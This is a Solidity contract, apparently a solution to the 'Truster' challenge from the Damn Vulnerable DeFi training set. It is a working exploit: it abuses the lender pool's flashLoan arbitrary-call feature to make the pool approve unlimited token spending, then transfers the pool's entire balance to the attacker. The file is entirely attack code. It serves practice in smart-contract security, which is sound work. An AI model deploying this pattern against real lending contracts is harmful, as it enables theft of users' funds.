// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterHacker {
    IERC20 immutable token;
    IPool immutable pool;
    address private attacker;

    constructor(address _token, address _pool) {
        token = IERC20(_token);
        pool = IPool(_pool);
        attacker = msg.sender;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            2**256 - 1
        );
        pool.flashLoan(0, address(this), address(token), data);

        uint256 balance = token.balanceOf(address(pool));

        token.transferFrom(address(pool), attacker, balance);
    }
}
